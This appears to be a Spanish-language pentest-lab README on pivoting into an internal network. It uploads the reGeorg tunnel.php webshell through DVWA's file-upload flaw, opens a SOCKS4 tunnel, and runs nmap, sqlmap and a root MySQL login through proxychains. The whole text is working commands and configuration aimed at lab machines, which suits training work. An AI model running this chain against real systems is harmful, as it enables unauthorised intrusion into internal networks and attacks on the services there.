# reGeorg — HTTP Tunneling y Pivoting

Túnel SOCKS4 a través de una webshell PHP para acceder a redes internas (NAT2) desde Kali.

---

## Ficheros

| Fichero | Contenido |
|---|---|
| `reGeorgGuide.txt` | Guía completa — instalación, subida de tunnel.php, proxychains, solución de problemas |
| `tunnel.php` | Webshell PHP que actúa como extremo del túnel en el servidor comprometido |

---

## Topología del lab

```
[ Kali ] ──NAT1──► [ DVWA (pivot) ] ──NAT2──► [ WebForPentesters ]
    │                     │
    └─ reGeorg.py          └─ tunnel.php
       SOCKS4:8888
```

Problema: Kali no tiene acceso directo a NAT2.  
Solución: tunelizar tráfico a través de DVWA usando reGeorg + proxychains.

---

## Flujo completo

### 1. Subir tunnel.php a DVWA

```bash
# Opción A: File Upload en DVWA
# Sube reGeorg/tunnels/tunnel.php
# URL resultante: http://<DVWA>/dvwa/hackable/uploads/tunnel.php

# Verificar
curl http://<DVWA>/dvwa/hackable/uploads/tunnel.php
# Respuesta esperada: Georg says, 'All seems fine'
```

### 2. Iniciar el túnel

```bash
# neo-reGeorg (python3) — versión actual recomendada
python3 reGeorgSocksProxy.py -u http://<DVWA>/dvwa/hackable/uploads/tunnel.php -p 8888

# reGeorg clásico (python2)
python2.7 reGeorg.py -u http://<DVWA>/dvwa/hackable/uploads/tunnel.php -p 8888
```

> ⚠️ Deja esta terminal abierta. El túnel vive mientras el proceso corre.

### 3. Configurar proxychains4

```bash
cp /etc/proxychains4.conf ./proxychains4.conf
nano proxychains4.conf
```

Cambios necesarios:
```ini
dynamic_chain          # descomentar
# strict_chain         # comentar

[ProxyList]
socks4  127.0.0.1  8888
```

### 4. Usar cualquier herramienta a través del túnel

```bash
proxychains -f ./proxychains4.conf nmap -sT -Pn -p 22,80,3306 <IP_NAT2>
proxychains -f ./proxychains4.conf curl http://<IP_NAT2>/
proxychains -f ./proxychains4.conf sqlmap -u "http://<IP_NAT2>/vuln.php?id=1"
proxychains -f ./proxychains4.conf mysql -h <IP_NAT2> -u root -p --ssl=False
```

> ⚠️ nmap requiere `-sT -Pn` con proxychains. Los scans SYN (`-sS`) no funcionan por SOCKS.

---

## Cheatsheet rápido

```bash
# 1. Verificar webshell
curl http://<DVWA>/hackable/uploads/tunnel.php
# → "Georg says, 'All seems fine'"

# 2. Iniciar túnel (terminal separada)
python3 reGeorgSocksProxy.py -u http://<DVWA>/hackable/uploads/tunnel.php -p 8888

# 3. proxychains — añadir: socks4 127.0.0.1 8888

# 4. Lanzar herramienta
proxychains -f ./proxychains4.conf <herramienta> <opciones>
```

---

## Solución de problemas

| Error | Causa | Solución |
|---|---|---|
| `Georg says, file not found` | Path incorrecto | Verificar URL con `curl` |
| `Connection refused 127.0.0.1:8888` | reGeorg no corre | Lanzarlo en otra terminal |
| `proxychains can't connect` | Puerto no coincide | Comprobar que ambos usan 8888 |
| `MySQL ERROR 2003` | MySQL rechaza conexión remota | Añadir `--ssl=False`, verificar puerto con nmap |
| `tunnel.php devuelve 403/404` | Ruta incorrecta o permisos | Verificar ruta exacta en DVWA |
